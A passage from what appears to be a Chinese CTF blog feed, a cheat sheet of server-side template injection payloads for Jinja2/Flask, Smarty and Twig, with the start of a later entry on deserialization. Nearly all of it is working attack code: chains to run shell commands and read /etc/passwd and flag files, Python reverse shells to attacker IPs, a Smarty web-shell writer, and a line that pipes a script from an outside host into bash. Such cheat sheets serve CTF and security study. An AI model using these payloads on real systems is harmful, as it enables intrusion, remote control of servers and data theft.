class="hljs-name">endfor</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;().__class__.__bases__[0].__subclasses__()[216].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;exec&#x27;](&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;VPS_IP&quot;,端口));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#x27;)&#125;&#125;</span><br></code></pre></td></tr></table></figure><h1 id="命令执行-catch-warnings"><a href="#命令执行-catch-warnings" class="headerlink" title="命令执行_catch_warnings"></a><code>命令执行_catch_warnings</code></h1><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> x <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> &#x27;war&#x27; <span class="hljs-keyword">in</span> x.__name__ %&#125;</span><span class="hljs-template-variable">&#123;&#123; x.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;) &#125;&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><br></code></pre></td></tr></table></figure><h1 id="catch-warnings-读取文件"><a href="#catch-warnings-读取文件" class="headerlink" title="catch_warnings 读取文件"></a><code>catch_warnings 读取文件</code></h1><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> x <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> x.__name__==&#x27;catch_warnings&#x27; %&#125;</span><span class="hljs-template-variable">&#123;&#123; x.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/app/flag&#x27;, &#x27;r&#x27;).read() &#125;&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><br></code></pre></td></tr></table></figure><h1 id="frozen-importlib-external-FileLoader-读取文件"><a href="#frozen-importlib-external-FileLoader-读取文件" class="headerlink" title="_frozen_importlib_external.FileLoader 读取文件"></a><code>_frozen_importlib_external.FileLoader 读取文件</code></h1><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> x <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="language-xml"> # </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> x <span class="hljs-keyword">in</span> [].__class__.__bases__[0].__subclasses__() %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> &#x27;FileLoader&#x27; <span class="hljs-keyword">in</span> x.__name__ %&#125;</span><span class="hljs-template-variable">&#123;&#123; x[&quot;get_data&quot;](0,&quot;/etc/passwd&quot;)&#125;&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><br></code></pre></td></tr></table></figure><h1 id="其他RCE"><a href="#其他RCE" class="headerlink" title="其他RCE"></a><code>其他RCE</code></h1><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-variable">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;g.pop.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;url_for.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;lipsum.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;get_flashed_messages.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;application.__init__.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;self.__init__.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;cycler.__init__.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;joiner.__init__.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;namespace.__init__.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;url_for.__globals__.current_app.add_url_rule(&#x27;/1333337&#x27;,view_func=url_for.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read)&#125;&#125;</span><br></code></pre></td></tr></table></figure><h1 id="思路一：如果object的某个派生类中存在险方法，就可以直接拿来用"><a href="#思路一：如果object的某个派生类中存在险方法，就可以直接拿来用" class="headerlink" title="思路一：如果object的某个派生类中存在险方法，就可以直接拿来用"></a><code>思路一：如果object的某个派生类中存在险方法，就可以直接拿来用</code></h1><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> x <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> x.__init__ is defined and x.__init__.__globals__ is defined and &#x27;eval&#x27; <span class="hljs-keyword">in</span> x.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;].__name__ %&#125;</span><span class="hljs-template-variable">&#123;&#123; x.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;) &#125;&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> x <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> x.__init__ is defined and x.__init__.__globals__ is defined and &#x27;os&#x27; <span class="hljs-keyword">in</span> x.__init__.__globals__ %&#125;</span><span class="hljs-template-variable">&#123;&#123; x.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read() &#125;&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> x <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> x.__init__ is defined and x.__init__.__globals__ is defined and &#x27;popen&#x27; <span class="hljs-keyword">in</span> x.__init__.__globals__ %&#125;</span><span class="hljs-template-variable">&#123;&#123; x.__init__.__globals__[&#x27;popen&#x27;](&#x27;ls /&#x27;).read() &#125;&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> x <span class="hljs-keyword">in</span> [].__class__.__base__.__sub</span><br><span class="hljs-template-tag"></span><br><span class="hljs-template-tag">classes__() %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> x.__init__ is defined and x.__init__.__globals__ is defined and &#x27;linecache&#x27; <span class="hljs-keyword">in</span> x.__init__.__globals__ %&#125;</span><span class="hljs-template-variable">&#123;&#123; x.__init__.__globals__[&#x27;linecache&#x27;][&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read() &#125;&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> x <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> x.__init__ is defined and x.__init__.__globals__ is defined and &#x27;linecache&#x27; <span class="hljs-keyword">in</span> x.__init__.__globals__ %&#125;</span><span class="hljs-template-variable">&#123;&#123; x.__init__.__globals__[&#x27;linecache&#x27;][&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read() &#125;&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> x <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="language-xml"></span><br><span class="language-xml">    </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> x.__init__ is defined and x.__init__.__globals__ is defined and &#x27;exec&#x27; <span class="hljs-keyword">in</span> x.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;exec&#x27;].__name__ %&#125;</span><span class="language-xml"></span><br><span class="language-xml">        </span><span class="hljs-template-variable">&#123;&#123; x.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;exec&#x27;](&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;123.3.3.3&quot;,111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#x27;)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">    </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><br></code></pre></td></tr></table></figure><h1 id="Python3-1"><a href="#Python3-1" class="headerlink" title="Python3"></a><code>Python3</code></h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">object</span>.__subclasses__()[<span class="hljs-number">37</span>].__call__(<span class="hljs-built_in">eval</span>, <span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)<span class="hljs-comment"># Python2</span><br><span class="hljs-built_in">object</span>.__subclasses__()[<span class="hljs-number">29</span>].__call__(<span class="hljs-built_in">eval</span>, <span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)<br><span class="hljs-built_in">object</span>.__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;.bash_history&#x27;</span>).read()<br></code></pre></td></tr></table></figure><h1 id="思路二：object的某个派生类导入了他险模块，就可以链式调用危险方法"><a href="#思路二：object的某个派生类导入了他险模块，就可以链式调用危险方法" class="headerlink" title="思路二：object的某个派生类导入了他险模块，就可以链式调用危险方法"></a><code>思路二：object的某个派生类导入了他险模块，就可以链式调用危险方法</code></h1><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> cls <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="language-xml"></span><br><span class="language-xml">    </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> cls.__init__ is defined and cls.__init__.__globals__ is defined %&#125;</span><span class="language-xml"></span><br><span class="language-xml">        </span><span class="hljs-template-tag">&#123;% <span class="hljs-name">set</span> sys_module = cls.__init__.__globals__.get(&#x27;sys&#x27;, None) %&#125;</span><span class="language-xml"></span><br><span class="language-xml">        </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> sys_module and &#x27;os&#x27; <span class="hljs-keyword">in</span> sys_module.modules %&#125;</span><span class="language-xml"></span><br><span class="language-xml">            </span><span class="hljs-template-variable">&#123;&#123; sys_module.modules[&#x27;os&#x27;].system(&#x27;whoami&#x27;) &#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">        </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml">    </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><br></code></pre></td></tr></table></figure><h1 id="Python3-2"><a href="#Python3-2" class="headerlink" title="Python3"></a><code>Python3</code></h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">object</span>.__subclasses__()[<span class="hljs-number">134</span>].__init__.__globals__[<span class="hljs-string">&#x27;sys&#x27;</span>].modules[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br><span class="hljs-built_in">object</span>.__subclasses__()[<span class="hljs-number">134</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><h1 id="Python2-1"><a href="#Python2-1" class="headerlink" title="Python2"></a><code>Python2</code></h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">object</span>.__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;sys&#x27;</span>].modules[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br><span class="hljs-built_in">object</span>.__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><h1 id="思路三"><a href="#思路三" class="headerlink" title="思路三"></a><code>思路三</code></h1><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> cls <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="language-xml"></span><br><span class="language-xml">    </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> cls.__init__ is defined and cls.__init__.__globals__ is defined %&#125;</span><span class="language-xml"></span><br><span class="language-xml">        </span><span class="hljs-template-tag">&#123;% <span class="hljs-name">set</span> collections_module = cls.__init__.__globals__.get(&#x27;_collections_abc&#x27;, None) %&#125;</span><span class="language-xml"></span><br><span class="language-xml">        </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> collections_module and collections_module.__dict__.get(&#x27;sys&#x27;, None) %&#125;</span><span class="language-xml"></span><br><span class="language-xml">            </span><span class="hljs-template-variable">&#123;&#123; collections_module.__dict__[&#x27;sys&#x27;].modules[&#x27;os&#x27;].system(&#x27;whoami&#x27;) &#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">        </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml">    </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><br></code></pre></td></tr></table></figure><h1 id="Python3-3"><a href="#Python3-3" class="headerlink" title="Python3"></a><code>Python3</code></h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">object</span>.__subclasses__()[<span class="hljs-number">170</span>].__init__.__globals__[<span class="hljs-string">&#x27;_collections_abc&#x27;</span>].__dict__(<span class="hljs-string">&#x27;sys&#x27;</span>).modules[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><h1 id="Python2-2"><a href="#Python2-2" class="headerlink" title="Python2"></a><code>Python2</code></h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">object</span>.__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;linecache&#x27;</span>].__dict__[<span class="hljs-string">&#x27;sys&#x27;</span>].modules[<span class="hljs-string">&#x27;os&#x27;</span>],system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><h1 id="特例："><a href="#特例：" class="headerlink" title="特例："></a><code>特例：</code></h1><h1 id="Python3-4"><a href="#Python3-4" class="headerlink" title="Python3"></a><code>Python3</code></h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">object</span>.__subclasses__()[<span class="hljs-number">134</span>]().__module__.__builtins__[<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><h1 id="Python2-3"><a href="#Python2-3" class="headerlink" title="Python2"></a><code>Python2</code></h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">object</span>.__subclasses__()[<span class="hljs-number">59</span>]().__module__.__builtins__[<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;whoami&quot;)</span><br></code></pre></td></tr></table></figure><h1 id="思路四-：基本类型的某些方法属于特殊方法，可以通过链式调用"><a href="#思路四-：基本类型的某些方法属于特殊方法，可以通过链式调用" class="headerlink" title="思路四 ：基本类型的某些方法属于特殊方法，可以通过链式调用"></a><code>思路四 ：基本类型的某些方法属于特殊方法，可以通过链式调用</code></h1><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> cls <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="language-xml"></span><br><span class="language-xml">    </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> cls.__init__ is defined and cls.__init__.__globals__ is defined %&#125;</span><span class="language-xml"></span><br><span class="language-xml">        </span><span class="hljs-template-tag">&#123;% <span class="hljs-name">set</span> collections_module = cls.__init__.__globals__.get(&#x27;_collections_abc&#x27;, None) %&#125;</span><span class="language-xml"></span><br><span class="language-xml">        </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> collections_module and collections_module.__dict__.get(&#x27;sys&#x27;, None) %&#125;</span><span class="language-xml"></span><br><span class="language-xml">            </span><span class="hljs-template-variable">&#123;&#123; collections_module.__dict__[&#x27;sys&#x27;].modules[&#x27;os&#x27;].system(&#x27;whoami&#x27;) &#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">        </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml">    </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">[].append.__class__.__call__(<span class="hljs-built_in">eval</span>, <span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-variable">&#123;&#123;get_flashed_message(可替换任意xxx读文件绕过(cat绕过)).__init__.__globals__&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">找 __builtins__再找__import__-&gt;[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()</span><br></code></pre></td></tr></table></figure><ul><li><code>__open__-&gt;[&#39;open&#39;](/flag).read()%20</code></li><li>&#96;&#96;.<strong>builtins</strong><a href="%22__import__('os'">‘eval’</a>.popen(‘cat &#x2F;flag’).read()”)}}&#96;</li></ul><p><code>==================================================================================================================================================================================================================================</code></p><h1 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a><code>Smarty</code></h1><p><code>//&#123;php&#125;标签执行php代码</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smarty">&#123;phplecho id ;l/php&#125;<br></code></pre></td></tr></table></figure><h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a><code>Getshell</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smarty">&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET[&#x27;cmd&#x27;]); ?&gt;&quot;,self::clearConfig())&#125;<br></code></pre></td></tr></table></figure><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a><code>RCE</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs smarty">&#123;system(&#x27;ls&#x27;)&#125;<br>&#123;if show_source (&#x27;/flag&#x27;)&#125;&#123;/if&#125;<br></code></pre></td></tr></table></figure><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell:"></a><code>反弹shell:</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smarty">&#123;system(&#x27;curl http://d.ylng.vip:12390/dev.txt|bash&#x27;)&#125;<br></code></pre></td></tr></table></figure><h1 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a><code>Twig</code></h1><ul><li><code>使用&#123;&#123;_self.env.getFilter&#125;&#125;报错，可以判断是Twig(报错后需要清空浏览器记录在重新访问，title也提示了是cookie)。于是抓包修改cookie中的user值，利用一下payload直接执行命令</code><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-variable">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="hljs-string">&quot;exec&quot;</span>)&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;_self.env.getFilter(<span class="hljs-string">&quot;id&quot;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="RCE-1"><a href="#RCE-1" class="headerlink" title="RCE"></a><code>RCE</code></h3><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-variable">&#123;&#123;self&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="hljs-string">&quot;exec&quot;</span>)&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;_self.env.getFilter(<span class="hljs-string">&quot;id&quot;</span>)&#125;&#125;</span><span class="language-xml">//这两个一起的</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;[<span class="hljs-string">&#x27;id&#x27;</span>]<span class="hljs-punctuation">|</span><span class="hljs-keyword">filter</span>(<span class="hljs-string">&#x27;system&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;[<span class="hljs-string">&#x27;cat\x20/etc/passwd&#x27;</span>]<span class="hljs-punctuation">|</span><span class="hljs-keyword">filter</span>(<span class="hljs-string">&#x27;system&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;[<span class="hljs-string">&#x27;cat$IFS/etc/passwd&#x27;</span>]<span class="hljs-punctuation">|</span><span class="hljs-keyword">filter</span>(<span class="hljs-string">&#x27;system&#x27;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure><pre><code class="hljs"></code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF-web</category>
      
      <category>SSTI</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web py</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>反序列化</title>
    <link href="/2024/09/01/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2024/09/01/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
